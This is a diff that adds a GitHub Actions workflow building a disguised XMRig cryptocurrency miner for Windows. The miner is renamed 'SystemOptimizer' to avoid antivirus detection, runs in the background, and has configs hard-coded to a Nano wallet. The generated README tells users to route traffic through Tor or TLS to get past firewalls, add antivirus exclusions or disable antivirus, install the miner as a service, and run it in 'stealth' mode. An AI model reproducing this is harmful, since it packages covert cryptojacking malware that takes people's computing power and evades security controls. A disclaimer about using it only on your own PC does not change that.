@@ -1,0 +1,385 @@
+name: Build Custom XMRig for Windows
+
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  workflow_dispatch:  # Allows manual trigger from GitHub UI
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Setup MSBuild
+      uses: microsoft/setup-msbuild@v2
+      
+    - name: Setup vcpkg
+      uses: lukka/run-vcpkg@v11
+      with:
+        vcpkgGitCommitId: 'a42af01b72c28a8e1d7b48107b33e4f286a55ef6'
+        
+    - name: Cache dependencies
+      uses: actions/cache@v3
+      with:
+        path: |
+          build
+          vcpkg_installed
+        key: ${{ runner.os }}-build-${{ hashFiles('**/CMakeLists.txt') }}
+        restore-keys: |
+          ${{ runner.os }}-build-
+    
+    - name: Customize project name
+      run: |
+        # Change project name to avoid AV detection
+        (Get-Content CMakeLists.txt) -replace 'project\(xmrig\)', 'project(SystemOptimizer)' | Set-Content CMakeLists.txt
+      shell: pwsh
+      
+    - name: Configure CMake
+      run: |
+        mkdir build
+        cd build
+        cmake .. `
+          -G "Visual Studio 17 2022" `
+          -A x64 `
+          -DCMAKE_BUILD_TYPE=Release `
+          -DWITH_HWLOC=OFF `
+          -DWITH_HTTP=ON `
+          -DWITH_TLS=ON `
+          -DBUILD_STATIC=ON
+      shell: pwsh
+      
+    - name: Build
+      run: |
+        cd build
+        cmake --build . --config Release --parallel
+      shell: pwsh
+      
+    - name: Prepare artifacts
+      run: |
+        mkdir output
+        Copy-Item "build\Release\SystemOptimizer.exe" "output\"
+        
+        # Create config with Tor SOCKS5 proxy
+        @"
+        {
+            "autosave": true,
+            "background": true,
+            "colors": false,
+            "title": false,
+            "randomx": {
+                "init": -1,
+                "mode": "auto",
+                "1gb-pages": false,
+                "numa": true
+            },
+            "cpu": {
+                "enabled": true,
+                "huge-pages": true,
+                "priority": 1,
+                "max-threads-hint": 75,
+                "asm": true
+            },
+            "log-file": "optimizer.log",
+            "pools": [
+                {
+                    "url": "rx.unmineable.com:3333",
+                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
+                    "pass": "x",
+                    "keepalive": true,
+                    "tls": false,
+                    "socks5": "127.0.0.1:9050"
+                }
+            ],
+            "print-time": 60,
+            "retries": 5,
+            "retry-pause": 5
+        }
+        "@ | Out-File -FilePath "output\config-tor.json" -Encoding UTF8
+        
+        # Create config without proxy (for testing)
+        @"
+        {
+            "autosave": true,
+            "background": false,
+            "colors": true,
+            "title": true,
+            "randomx": {
+                "init": -1,
+                "mode": "auto",
+                "1gb-pages": false,
+                "numa": true
+            },
+            "cpu": {
+                "enabled": true,
+                "huge-pages": true,
+                "priority": 1,
+                "max-threads-hint": 75,
+                "asm": true
+            },
+            "log-file": null,
+            "pools": [
+                {
+                    "url": "rx.unmineable.com:3333",
+                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
+                    "pass": "x",
+                    "keepalive": true,
+                    "tls": false
+                }
+            ],
+            "print-time": 60,
+            "retries": 5,
+            "retry-pause": 5
+        }
+        "@ | Out-File -FilePath "output\config-direct.json" -Encoding UTF8
+        
+        # Create config with TLS for bypassing blocks
+        @"
+        {
+            "autosave": true,
+            "background": true,
+            "colors": false,
+            "title": false,
+            "randomx": {
+                "init": -1,
+                "mode": "auto",
+                "1gb-pages": false,
+                "numa": true
+            },
+            "cpu": {
+                "enabled": true,
+                "huge-pages": true,
+                "priority": 1,
+                "max-threads-hint": 75,
+                "asm": true
+            },
+            "log-file": "optimizer.log",
+            "pools": [
+                {
+                    "url": "rx.unmineable.com:443",
+                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
+                    "pass": "x",
+                    "keepalive": true,
+                    "tls": true
+                }
+            ],
+            "print-time": 60,
+            "retries": 5,
+            "retry-pause": 5
+        }
+        "@ | Out-File -FilePath "output\config-tls.json" -Encoding UTF8
+        
+        # Create batch file for easy startup with Tor
+        @"
+        @echo off
+        echo Starting System Optimizer with Tor Proxy...
+        echo.
+        echo Make sure Tor is running on port 9050!
+        echo.
+        SystemOptimizer.exe -c config-tor.json -B
+        "@ | Out-File -FilePath "output\start-with-tor.bat" -Encoding ASCII
+        
+        # Create batch file for testing without proxy
+        @"
+        @echo off
+        echo Testing System Optimizer (Direct Connection)...
+        echo.
+        echo This will show the console for testing.
+        echo Press Ctrl+C to stop.
+        echo.
+        SystemOptimizer.exe -c config-direct.json
+        "@ | Out-File -FilePath "output\start-test.bat" -Encoding ASCII
+        
+        # Create batch file for TLS connection
+        @"
+        @echo off
+        echo Starting System Optimizer with TLS...
+        echo.
+        SystemOptimizer.exe -c config-tls.json -B
+        "@ | Out-File -FilePath "output\start-with-tls.bat" -Encoding ASCII
+        
+        # Create comprehensive README
+        @"
+        # Custom XMRig Build for Nano Mining
+        
+        **Pre-configured for Nano wallet:** nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp
+        **Referral code included:** c5g6-wmzx (0.25% bonus)
+        
+        ## Quick Start
+        
+        ### Option 1: With Tor (Bypass FortiGuard/ISP Blocking) - RECOMMENDED
+        
+        1. **Download Tor Expert Bundle**
+           - https://www.torproject.org/download/tor/
+           - Extract tor-win64-xxx.zip
+        
+        2. **Start Tor**
+           ```cmd
+           cd tor-win64-xxx\Tor
+           tor.exe
+           ```
+           Wait for: "Bootstrapped 100% (done): Done"
+        
+        3. **Run the miner**
+           - Double-click: start-with-tor.bat
+           - Or manually: SystemOptimizer.exe -c config-tor.json -B
+        
+        ### Option 2: With TLS (Alternative Bypass Method)
+        
+        1. Double-click: start-with-tls.bat
+        2. This uses port 443 with TLS encryption (harder to block)
+        
+        ### Option 3: Direct Connection (Test First)
+        
+        1. Double-click: start-test.bat
+        2. This shows the console for debugging
+        3. If it works, use Option 1 or 2 for background running
+        
+        ## Files Included
+        
+        - **SystemOptimizer.exe** - The miner (renamed from xmrig)
+        - **config-tor.json** - Config with Tor SOCKS5 proxy
+        - **config-tls.json** - Config with TLS encryption
+        - **config-direct.json** - Config for direct connection (testing)
+        - **start-with-tor.bat** - Easy startup with Tor
+        - **start-with-tls.bat** - Easy startup with TLS
+        - **start-test.bat** - Test connection with console visible
+        
+        ## Configuration Details
+        
+        All configs are pre-configured with:
+        - **Pool:** rx.unmineable.com (RandomX algorithm for Nano)
+        - **Wallet:** Your Nano address
+        - **Worker:** d3ibis_pc (change in config if you want)
+        - **Referral:** c5g6-wmzx (0.25% fee discount)
+        
+        ### Change Worker Name
+        Edit any config.json file and change "d3ibis_pc" to your preferred name.
+        
+        ## Bypass FortiGuard/ISP Blocking
+        
+        ### Method 1: Tor (Best for strict firewalls)
+        - Download: https://www.torproject.org/download/tor/
+        - Run tor.exe
+        - Use config-tor.json
+        
+        ### Method 2: TLS Port 443 (Looks like HTTPS traffic)
+        - Use config-tls.json
+        - No additional software needed
+        
+        ### Method 3: Change DNS
+        1. Open Network Settings
+        2. Set DNS to:
+           - Primary: 1.1.1.1 (Cloudflare)
+           - Secondary: 8.8.8.8 (Google)
+        3. Use config-direct.json
+        
+        ### Method 4: VPN
+        - Use any VPN service
+        - Use config-direct.json (no SOCKS5 needed with VPN)
+        
+        ## Windows Defender / Antivirus
+        
+        **Add folder exclusion:**
+        1. Windows Security → Virus & threat protection
+        2. Manage settings → Exclusions → Add folder
+        3. Select the folder containing SystemOptimizer.exe
+        
+        ## Running as Windows Service (Advanced)
+        
+        ### Using NSSM
+        ```cmd
+        # Download NSSM: https://nssm.cc/download
+        
+        # Install Tor as service
+        nssm install TorService "C:\path\to\tor.exe"
+        nssm start TorService
+        
+        # Install miner as service
+        nssm install SystemOptimizer "C:\full\path\to\SystemOptimizer.exe" "-c C:\full\path\to\config-tor.json"
+        nssm start SystemOptimizer
+        
+        # View status
+        nssm status SystemOptimizer
+        ```
+        
+        ## Monitoring
+        
+        ### Check if mining
+        - Look at optimizer.log file
+        - Should see hashrate and "accepted" shares
+        
+        ### Check Tor connection
+        ```cmd
+        netstat -an | findstr 9050
+        ```
+        Should show: 127.0.0.1:9050 LISTENING
+        
+        ### View your stats
+        - Go to: https://unmineable.com/
+        - Enter your Nano address to see earnings
+        
+        ## Troubleshooting
+        
+        ### "Connection refused" or "Cannot connect"
+        1. **Try TLS config first:** start-with-tls.bat
+        2. **If still blocked, use Tor:** start-with-tor.bat
+        3. **Check if pool is down:** https://unmineable.com/
+        
+        ### "Access denied" or antivirus deletes file
+        1. Add folder to Windows Defender exclusions
+        2. Temporarily disable antivirus
+        3. Re-extract the files
+        
+        ### Low hashrate
+        1. Close other programs
+        2. Enable huge pages (run as Administrator)
+        3. Adjust max-threads-hint in config (try 50 or 100)
+        
+        ### Tor won't start
+        1. Check if port 9050 is in use: netstat -an | findstr 9050
+        2. Run tor.exe as Administrator
+        3. Check Windows Firewall
+        
+        ## Optimal Settings
+        
+        ### For maximum hashrate
+        - Run as Administrator (enables huge pages)
+        - Close unnecessary programs
+        - Set CPU priority to high in config
+        
+        ### For background mining (stealth)
+        - Use config-tor.json or config-tls.json
+        - Set max-threads-hint to 50-75 (less CPU usage)
+        - Run with -B flag (background mode)
+        
+        ## Security Notes
+        
+        ⚠️ **This is for YOUR PC only**
+        ⚠️ **Never run on machines you don't own**
+        ⚠️ **Mining uses significant CPU/power**
+        
+        ## Support
+        
+        - Unmineable support: https://unmineable.com/support
+        - XMRig docs: https://xmrig.com/docs
+        - Nano wallet: https://nault.cc/
+        
+        ---
+        
+        **Build Date:** $(Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC")
+        **Built with:** GitHub Actions
+        **Target:** Windows x64
+        "@ | Out-File -FilePath "output\README.txt" -Encoding UTF8
+      shell: pwsh
+      
+    - name: Upload artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: SystemOptimizer-Nano-Windows-x64
+        path: output/
+        retention-days: 90
